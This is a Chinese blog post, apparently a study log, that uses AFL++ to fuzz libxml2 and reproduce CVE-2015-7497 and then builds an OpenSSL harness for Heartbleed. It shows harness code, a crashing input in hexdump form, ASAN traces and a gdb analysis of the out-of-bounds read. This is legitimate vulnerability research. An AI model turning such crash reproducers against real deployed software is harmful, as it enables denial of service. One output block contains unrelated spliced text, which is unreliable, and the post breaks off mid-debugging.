<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="theme-color" content="#1f2128">
<title>afl_training  | Orrr</title>
<link rel="shortcut icon" href="/favicon.ico?v=1726127756933">
<link rel="stylesheet" href="/media/css/mist.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.loli.net/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/tomorrow-night.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="afl_training " />
  <meta name="keywords" content="fuzz" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="mist">
  <header class="header bg-color ">
    <div class="blog-header box-shadow-wrapper  " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="">
              <span class="logo-line-before">
                <i class=""></i>
              </span>
              <span class="main-title">Orrr</span>
              <span class="logo-line-after">
                <i class=""></i>
              </span>
            </a>  
          
        </div>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-globe"></i> 首页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives" target="_self">
                  <i class="fa fa-globe"></i> 归档
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="https://oraclepi.tech/tags" target="_self">
                  <i class="fa fa-tags"></i> 标签
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="https://oraclepi.tech/post/about" target="_self">
                  <i class="fa fa-user"></i> 关于
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友链
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout mist bg-color">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper  right-motion" id="sidebar">
      
      <div class="sidebar-body mist" id="sidebar_body">
        
          
            <div style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number compress"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#libxml2">libxml2：</a>
<ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言：</a></li>
<li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">准备工作：</a></li>
<li><a href="#%E7%BC%96%E5%86%99harness">编写harness：</a></li>
<li><a href="#%E4%BC%98%E5%8C%96harness">优化harness：</a></li>
<li><a href="#crash%E5%88%86%E6%9E%90">crash分析：</a></li>
</ul>
</li>
<li><a href="#heartbleed">heartbleed:</a>
<ul>
<li><a href="#%E5%89%8D%E8%A8%80-2">前言：</a></li>
<li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C-2">准备工作：</a></li>
<li><a href="#fuzzing">Fuzzing:</a></li>
<li><a href="#crash%E5%88%86%E6%9E%90-2">crash分析：</a></li>
</ul>
</li>
<li><a href="#sendmail_1301">sendmail_1301:</a>
<ul>
<li><a href="#%E5%89%8D%E8%A8%80-3">前言：</a></li>
<li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C-3">准备工作：</a></li>
<li><a href="#fuzzing-2">Fuzzing:</a></li>
<li><a href="#crash%E5%88%86%E6%9E%90-3">crash分析：</a></li>
</ul>
</li>
<li><a href="#%E5%B0%8F%E7%BB%93">小结：</a></li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // 保存li元素
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // 处理不是从#一级标题开始目录
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/VX0_6BnfV/"> afl_training  </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">发布于</span>
      <span class="publish-time" data-t="2023-10-08 13:11:32">2023-10-08</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">标签:</span>
       
      <a href="https://oraclepi.tech/tag/cwoqnEuqX/">
        <span>fuzz</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >24<span class="language" data-lan="minute"
          >分钟</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >4274<span class="pc-show language" data-lan="words"
          >字数</span
        ></span
      >
    </span>
      
    <span
      id="/post/VX0_6BnfV/"
      data-flag-title="afl_training "
      class="meta-item pc-show leancloud_visitors"
    >
      <span class="post-meta-divider">|</span>
      <i class="fa fa-eye"></i>
      <span
        ><span class="language" data-lan="view">浏览量:</span>:<span
          class="leancloud-visitors-count"
        ></span
      ></span>
    </span>
    
  </div>
</section>

            <div class="post-body next-md-body" id="post_body">
              <h2 id="libxml2">libxml2：</h2>
<h3 id="前言">前言：</h3>
<p>本文记录afl-training的第一篇，复现<code>CVE-2015-7497</code></p>
<h3 id="准备工作">准备工作：</h3>
<p>按照官方操作,本机下面需要设置下临时环境变量</p>
<pre><code class="language-bash">git submodule init &amp;&amp; git submodule update
cd libxml2
export CC=afl-clang-fast 
./autogen.sh 
export AFL_USE_ASAN=1 
make -j 4
</code></pre>
<p>我们使用了<code>ASAN</code>，即<code>address sanitizer</code>，一个快速的内存错误检测工具，可以在内存分配失败时立即退出并打印错误信息，但有的情况下内存分配失败并不会导致程序崩溃<br>
为了方便后面fuzz后处理crash，我们可以开启<code>ASAN</code>并设置临时环境变量禁用<code>export ASAN_OPTIONS=detect_leaks=0</code></p>
<p>不过开启<code>ASAN</code>之后编译的测试程序<code>./testModule</code>运行时报错</p>
<pre><code class="language-bash">fk@fk-pop:/home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2# ./testModule 
[-] FATAL: forkserver is already up, but an instrumented dlopen() library loaded afterwards. You must AFL_PRELOAD such libraries to be able to fuzz them or LD_PRELOAD to run outside of afl-fuzz.
To ignore this set AFL_IGNORE_PROBLEMS=1 but this will lead to ambiguous coverage data.
In addition, you can set AFL_IGNORE_PROBLEMS_COVERAGE=1 to ignore the additional coverage instead  is going to be easy to
fuzz, is definitely exposed to user-provided input in many situations, and is at high risk of containing bugs (parsing a
complex data format in an unsafe language).

This functionality is exposed in the [parser](http://xmlsoft.org/html/libxml-parser.html) API, and whilst you could dig
through this documentation, the easiest approach is to look at an example.
[`parse1.c`](http://xmlsoft.org/examples/parse1.c) (also in the (use with caution!).
</code></pre>
<p>有人提过类似的issue <a href="https://coder.social/antonio-morales/fuzzing101/issues/21">https://coder.social/antonio-morales/fuzzing101/issues/21</a><br>
追溯到官方FAQ有两种解决方案，一种是设置临时环境变量</p>
<pre><code class="language-bash">export AFL_PRELOAD=foo.so
</code></pre>
<p>但是笔者设置之后仍然报错，且在本机检索后并未找到<code>foo.so</code><br>
(<code>foo.so</code>其实并不是什么东西，<code>foo</code>的本意就是无意义，得strace附加进程上看相关的动态链接库</p>
<p>第二种设置临时环境变量忽略后测试成功</p>
<pre><code class="language-bash">export AFL_IGNORE_PROBLEMS=1 
</code></pre>
<h3 id="编写harness">编写harness：</h3>
<p>以上我们并未生成fuzz所需的入口程序，根据官方文档所说，即是我们需要一个<code>fuzzing harness</code>，笔者也是第一次，所以跟着官方文档的hint走了<br>
根据官方文档描述<code>libxml2</code>的api很多，但是最容易进行模糊测试的是核心XML解析逻辑，因为它暴露在<code>用户输入</code>的情况下，可能在处理不安全的复杂数据时出现bug<br>
根据官方给的example<a href="http://xmlsoft.org/examples/parse1.c">http://xmlsoft.org/examples/parse1.c</a>可以自己大概改一个，从命令行读入文件名的harness</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;libxml/parser.h&gt;
#include &lt;libxml/tree.h&gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */

    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &quot;Failed to parse %s\n&quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}

</code></pre>
<p>使用以下指令编译</p>
<pre><code class="language-bash">afl-clang-fast ./fuzz.c -I ./include ./.libs/libxml2.a -lz -lm -g -o fuzzer 

#-I 指定include目录和libxml2的静态链接库
#-lm使用math库，-lz使用zlib库，-g开启debug模式

</code></pre>
<p>报错</p>
<pre><code class="language-bash">[-] PROGRAM ABORT : Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!
         Location : check_asan_opts(), src/afl-fuzz-init.c:2651
</code></pre>
<p>查询相关issue:<a href="https://groups.google.com/g/afl-users/c/XaE06yzKOu8">https://groups.google.com/g/afl-users/c/XaE06yzKOu8</a><br>
再次设置环境变量</p>
<pre><code class="language-bash">export ASAN_OPTIONS=abort_on_error=1:symbolize=0
</code></pre>
<p>可以正常fuzz<br>
<img src="https://oraclepi.tech/post-images/1696223602862.png" alt="" loading="lazy"></p>
<h3 id="优化harness">优化harness：</h3>
<p>但是太慢了，我们根据afl++文档可以添加一点优化<br>
注意不必要语句的删除，下面是失败示例</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;libxml/parser.h&gt;
#include &lt;libxml/tree.h&gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while(__AFL_LOOP(1000)){
    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &quot;Failed to parse %s\n&quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}
</code></pre>
<p>成功示例，注意两者区别：</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;libxml/parser.h&gt;
#include &lt;libxml/tree.h&gt;

int main(int argc, char **argv)
{
    if (argc != 2)
        return (1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while (__AFL_LOOP(1000))
    {
        doc = xmlReadFile(argv[1], NULL, 0);
        if (doc != NULL)
        {
            xmlFreeDoc(doc);
        }
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return (0);
}
</code></pre>
<p>最后效率提升最高30x</p>
<h3 id="crash分析">crash分析：</h3>
<p>4个小时8个unique crash<br>
<img src="https://oraclepi.tech/post-images/1696223609962.png" alt="" loading="lazy"></p>
<p>使用<code>afl-tmin</code>精简input:</p>
<pre><code class="language-bash">for i in id*; do afl-tmin -i $i -o ./tmp/$i -m none -- ./fuzzer @@; done;
</code></pre>
<p><code>../fuzzer 输入文件</code>查看报错信息，发现有几个输入文件错误发生在<code>parser.c</code>的第10666行，即错误发生在宏<code>MOVETO_ENDTAG();</code>中，并不是我们想要复现的<code>xmlDictComputeFastQKey</code>函数<br>
<img src="https://oraclepi.tech/post-images/1696223617986.png" alt="" loading="lazy"><br>
使用gdb调试跟进确认错误出现在宏定义处，并不是我们想要复现的错误</p>
<p>好在有一个输入样本能触发CVE中的错误</p>
<pre><code class="language-bash">fk@fk-pop:~/文档/fuzzing/afl-training/challenges/libxml2/libxml2/opt/default/crashes/tmp$ hexdump -C id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 
00000000  3c 4a 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |&lt;J00000000000000|
00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000350  30 30 3a 4a 30 30 30 30  30 30 30 30 30 30 30 30  |00:J000000000000|
00000360  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
000003b0  30 30 30 30 30 30 30 30  30 30                    |0000000000|
000003ba
</code></pre>
<p>即<code>xmlDictComputeFastQKey</code>函数中的溢出</p>
<pre><code class="language-bash">=================================================================
==3397754==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62100000123c at pc 0x556c7cb6c531 bp 0x7ffe76acfde0 sp 0x7ffe76acfdd8
READ of size 1 at 0x62100000123c thread T0
    #0 0x556c7cb6c530 in xmlDictComputeFastQKey /home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:489:18
    #1 0x556c7cb6a16f in xmlDictQLookup /home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:1093:12
    #2 0x556c7cb79590 in xmlSAX2StartElementNs /home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2/SAX2.c:2238:17
</code></pre>
<p>binary ninja查看调用<code>xmlDictComputeFastQKey</code>函数的偏移<br>
<img src="https://oraclepi.tech/post-images/1696223625979.png" alt="" loading="lazy"><br>
gdb断点打过去:</p>
<pre><code>gdb --args ../fuzzer id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 

b *$rebase(0x03de16b)

c
</code></pre>
<p>可以得到相关寄存器值</p>
<pre><code class="language-bash"> ► 0x55555593216b &lt;xmlDictQLookup+235&gt;    call   xmlDictComputeFastQKey                &lt;xmlDictComputeFastQKey&gt;
        rdi: 0x6190000000d7 ◂— 0x303030303030304a ('J0000000')
        rsi: 0x351
        rdx: 0x621000001528 ◂— 'J000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
        rcx: 0x67
        r8: 0x2e70efeb

</code></pre>
<p>根据<code>dict.c</code>中函数传参规则，plen对应<code>$rsi</code>，len对应<code>$rcx</code><br>
<code>len-(plen+1+1)</code>即<code>0x67-(0x351+0x1+0x1)=-0x2EC</code><br>
下标负数,数组越界</p>
<pre><code class="language-c">static unsigned long
xmlDictComputeFastQKey(const xmlChar *prefix, int plen,
                       const xmlChar *name, int len, int seed)
{
    unsigned long value = (unsigned long) seed;

    if (plen == 0)
	value += 30 * (unsigned long) ':';
    else
	value += 30 * (*prefix);

    if (len &gt; 10) {
        value += name[len - (plen + 1 + 1)];
        len = 10;
	if (plen &gt; 10)
	    plen = 10;
    }
    switch (plen) {
        case 10: value += prefix[9];
        case 9: value += prefix[8];
        case 8: value += prefix[7];
        case 7: value += prefix[6];
        case 6: value += prefix[5];
        case 5: value += prefix[4];
        case 4: value += prefix[3];
        case 3: value += prefix[2];
        case 2: value += prefix[1];
        case 1: value += prefix[0];
        default: break;
    }
    len -= plen;
    if (len &gt; 0) {
        value += (unsigned long) ':';
	len--;
    }
    switch (len) {
        case 10: value += name[9];
        case 9: value += name[8];
        case 8: value += name[7];
        case 7: value += name[6];
        case 6: value += name[5];
        case 5: value += name[4];
        case 4: value += name[3];
        case 3: value += name[2];
        case 2: value += name[1];
        case 1: value += name[0];
        default: break;
    }
    return(value);
}
</code></pre>
<h2 id="heartbleed">heartbleed:</h2>
<h3 id="前言-2">前言：</h3>
<p>本文记录afl-training的第二篇，复现心脏滴血漏洞</p>
<h3 id="准备工作-2">准备工作：</h3>
<p>设置环境变量：</p>
<pre><code class="language-bash">export CC=afl-clang-fast CXX=afl-clang-fast++ AFL_USE_ASAN=1
</code></pre>
<p>然后：</p>
<pre><code class="language-bash">./config -d
make
</code></pre>
<p>在原来的<code>handshake.cc</code>上作修改，在<code>BIO_write</code>前初始化<code>size</code>和<code>data</code>：</p>
<pre><code class="language-cpp">// Copyright 2016 Google Inc. All Rights Reserved.
// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
#include &lt;openssl/ssl.h&gt;
#include &lt;openssl/err.h&gt;
#include &lt;assert.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stddef.h&gt;
#include &lt;unistd.h&gt;

#ifndef CERT_PATH
# define CERT_PATH
#endif

SSL_CTX *Init() {
  SSL_library_init();
  SSL_load_error_strings();
  ERR_load_BIO_strings();
  OpenSSL_add_all_algorithms();
  SSL_CTX *sctx;
  assert (sctx = SSL_CTX_new(TLSv1_method()));
  /* These two file were created with this command:
      openssl req -x509 -newkey rsa:512 -keyout server.key \
     -out server.pem -days 9999 -nodes -subj /CN=a/
  */
  assert(SSL_CTX_use_certificate_file(sctx, &quot;server.pem&quot;,
                                      SSL_FILETYPE_PEM));
  assert(SSL_CTX_use_PrivateKey_file(sctx, &quot;server.key&quot;,
                                     SSL_FILETYPE_PEM));
  return sctx;
}

int main() {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);

  /* TODO: To spoof one end of the handshake, we need to write data to sinbio
   * here */
  #ifdef __AFL_HAVE_MANUAL_CONTROL
    __AFL_INIT();
  #endif
  uint8_t data[100] = {0};
  size_t size = read(STDIN_FILENO, data, 100);
  if (size == -1) {
    printf(&quot;Failed to read from stdin\n&quot;);
    return(-1);
  }
  BIO_write(sinbio, data, size);

  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}
</code></pre>
<p>编译：</p>
<pre><code class="language-bash">afl-clang-fast++ ./handshake.cc -I ./include ./libssl.a ./libcrypto.a -ldl -g -o handshake
</code></pre>
<h3 id="fuzzing">Fuzzing:</h3>
<p><code>ipt</code>中生成随机种子：</p>
<pre><code class="language-bash">cd ipt &amp;&amp; dd if=/dev/urandom of=1.in bs=64 count=10
</code></pre>
<p>开始fuzz前注意将<code>server.key server.pem</code>放在和<code>handshake</code>同目录下</p>
<pre><code class="language-bash">afl-fuzz -i ipt/ -o opt/ -m none ./handshake
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://oraclepi.tech/post-images/1696483359558.png" alt="" loading="lazy"></figure>
<h3 id="crash分析-2">crash分析：</h3>
<p>将<code>handshake</code>移至<code>crashes</code>目录下使用<code>afl-tmin</code>简化<code>input</code></p>
<pre><code class="language-bash">for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./handshake;done;
</code></pre>
<p>之后使用简化后的<code>input</code>测试</p>
<pre><code class="language-bash">fk@fk-pop:~/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp$ gdb handshake 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from handshake...
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections ''
pwndbg&gt; ls
handshake									 id:000006,sig:06,src:000236,time:22339456,execs:17321069,op:havoc,rep:7
id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1		 id:000007,sig:06,src:000233,time:23634783,execs:18301688,op:havoc,rep:3
id:000001,sig:06,src:000024+000075,time:4119745,execs:3210038,op:splice,rep:17	 id:000008,sig:06,src:000294+000226,time:25859527,execs:19982226,op:splice,rep:2
id:000002,sig:06,src:000053+000041,time:5079793,execs:3956550,op:splice,rep:4	 id:000009,sig:06,src:000270,time:26541712,execs:20500629,op:havoc,rep:1
id:000003,sig:06,src:000024+000068,time:10115665,execs:7871015,op:splice,rep:12  server.key
id:000004,sig:06,src:000040+000006,time:16647584,execs:12944780,op:splice,rep:4  server.pem
id:000005,sig:06,src:000224,time:22158868,execs:17184882,op:havoc,rep:4
This command is deprecated in Pwndbg. Please use the GDB's built-in syntax for running shell commands instead: !ls &lt;args&gt;
pwndbg&gt; run &lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
Starting program: /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake &lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
=================================================================
